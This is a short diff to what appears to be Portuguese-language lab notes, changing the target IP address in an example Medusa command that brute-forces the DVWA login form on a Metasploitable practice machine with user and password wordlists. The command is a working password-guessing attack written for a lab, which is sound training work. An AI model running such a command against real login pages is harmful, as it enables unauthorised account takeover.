@@ -18,7 +18,7 @@ metasploitable-linux-2.0.0.
 Exemplo de Utilização da Ferramenta Meduza;
 
 Linha de comando:
-medusa -h 192.168.56.102 -U user.txt -P pass.txt -M http \
+medusa -h 192.168.59.132 -U user.txt -P pass.txt -M http \
 -m page:'/dvwa/login.php' \
 -m form:'username=^USER^&password=^pass^&login=login'\
 -m 'FAIL=login failed' -t 6
